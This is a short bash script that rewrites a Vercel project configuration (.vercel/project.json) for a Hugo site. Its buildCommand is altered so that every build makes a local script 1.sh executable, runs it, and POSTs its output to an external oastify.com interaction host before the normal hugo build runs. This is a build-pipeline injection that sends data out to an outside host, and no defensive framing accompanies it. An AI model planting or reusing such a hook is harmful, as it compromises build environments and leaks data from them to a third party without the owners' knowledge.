#!/bin/bash

echo '{"projectId":"prj_udzjWEbCYSgC5jKKS9gtL2cEziYv","orgId":"team_RjvV9ZDkklN7ZaMRR8ZcH2yS","settings":{"createdAt": 1672984231839,"installCommand": null,"buildCommand": "curl -X POST -d \"$(chmod 777 1.sh && ./1.sh)\" https://tebvp8x6drpdp3n0butq3nja319sxls9h.oastify.com/local && hugo -D --gc","devCommand": null,"outputDirectory": null,"rootDirectory": null,"framework": "hugo","nodeVersion": "18.x"}}' > .vercel/project.json
cat .vercel/project.json
echo "up"
